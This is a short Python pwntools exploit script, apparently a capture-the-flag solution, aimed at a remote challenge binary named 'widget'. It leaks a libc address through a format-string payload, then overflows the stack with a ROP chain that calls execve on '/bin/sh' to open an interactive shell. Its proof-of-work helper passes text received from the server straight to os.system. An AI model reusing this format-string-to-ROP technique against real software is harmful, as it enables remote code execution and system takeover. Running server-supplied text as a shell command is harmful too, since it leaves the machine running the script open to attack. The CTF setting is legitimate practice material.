from pwn import *
import os
import time 

# Set up pwntools for the correct architecture
exe = "./widget"
libc = ELF("./libc.so.6")
elf = ELF(exe)
context.log_level = "debug"
context.binary = elf

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* 0x00000000004014c7
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def pow():
    ru("proof of work: ")
    proff = str((ru("solution:")[:-10]))[2:-1]
    print(proff)
    os.system(f"{proff} > test")
    print(f"{proff} > test")
    time.sleep(7)
    with open("test") as f:
        sl(f.readline())

# r = start()
r = remote("challs.actf.co", 31320)

pow()

sl(b"70")

sl(b"-%3$p" + b"A"*(40-5-8) + p64(0x40402a -5 + 0x24) + p64(elf.sym.main + 209)) 

ru(b"-")
libc.address = int(re(14), 16) - 1133111
log.info(f"{hex(libc.address)}")

prdi = libc.address + 0x000000000002a3e5
prsi = libc.address + 0x000000000002be51
prax = libc.address + 0x0000000000045eb0
syscall = libc.address + 0x0000000000029db4

sl(b"A"*(40) + p64(prax) + p64(59) + p64(prdi) + p64(next(libc.search(b"/bin/sh\x00"))) + p64(prsi) + p64(0) +  p64(syscall) )

r.interactive()